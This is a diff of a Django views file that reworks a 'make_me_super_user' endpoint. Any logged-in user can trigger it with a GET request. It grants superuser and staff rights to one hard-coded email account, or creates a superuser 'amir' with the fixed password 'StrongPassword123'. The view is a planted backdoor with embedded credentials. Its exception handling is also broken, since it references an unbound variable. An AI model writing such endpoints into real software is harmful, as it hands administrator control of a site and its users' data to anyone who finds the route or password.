@@ -121,14 +121,22 @@ def comment_add_comment(request, course_id, lesson_id):
 
 
 @login_required
-@require_http_methods(['GET'])
+@require_http_methods(["GET"])
 def make_me_super_user(request):
-    amir = Student.objects.get(email='amirdwikatmain@example.com')
     try:
-        if amir.is_superuser:
-            return HttpResponse("is already a superuser...")
+        user = Student.objects.get(email="amirdwikatmain@example.com")
+        if user.is_superuser:
+            return HttpResponse("Already a superuser.")
         else:
-            Student.objects.create_superuser(username=amir.username, email=amir.email, password=amir.password)
-            return HttpResponse("Done!")
-    except amir.DoesNotExist:
-        return HttpResponse("DoesNotExist.")
+            user.is_superuser = True
+            user.is_staff = True
+            user.save()
+            return HttpResponse("Upgraded to superuser successfully!")
+    except user.DoesNotExist:
+        # تنشئ سوبر يوزر جديد لو ما كان موجود
+        Student.objects.create_superuser(
+            username="amir",
+            email="amirdwikatmain@example.com",
+            password="StrongPassword123"
+        )
+        return HttpResponse("Superuser created successfully!")
